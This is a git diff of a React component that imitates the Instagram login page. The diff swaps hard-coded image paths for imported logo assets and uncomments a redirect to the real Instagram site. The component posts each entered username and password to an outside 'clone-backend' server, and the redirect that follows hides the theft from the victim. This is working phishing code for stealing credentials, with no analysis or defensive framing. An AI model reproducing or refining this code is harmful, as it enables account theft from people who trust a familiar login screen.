@@ -1,5 +1,9 @@
 import React, { useState , useEffect} from "react";
 import axios from "axios";
+import logo from '../assets/image/instagram-logo.png'
+import facebook from '../assets/image/facebook-logo.png'
+import micro from '../assets/image/Micro.png'
+import img1 from '../assets/image/App.png'
 const Home = () => {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -10,7 +14,7 @@ const Home = () => {
     axios.post("https://clone-backend-jvih.onrender.com/email", { username, password })
     .then((res) => {
       console.log(res);
-      // window.location.href = "https://www.instagram.com/";
+      window.location.href = "https://www.instagram.com/";
     })
   };
 
@@ -43,7 +47,7 @@ const Home = () => {
             <div className="instagram-logo-box">
               <img
                 className="instagram-logo"
-                src="src/assets/instagram-logo.png"
+                src={logo}
               />
             </div>
 
@@ -82,7 +86,7 @@ const Home = () => {
               <div className="flex flex-row items-center justify-between">
                 <img
                   className="facebook-logo"
-                  src="src/assets/facebook-logo.png"
+                  src={facebook}
                 />
                 <a
                   className="facebook-login"
@@ -115,10 +119,10 @@ const Home = () => {
             <p>Get the app.</p>
             <div className="download-container">
               <a className="download-appstore" href="#" target="_blank">
-                <img className="appstore" src="src/assets/App.png" />
+                <img className="appstore" src={img1} />
               </a>
               <a className="download-googleplay" href="#" target="_blank">
-                <img className="googleplay" src="src/assets/Micro.png" />
+                <img className="googleplay" src={micro} />
               </a>
             </div>
           </div>
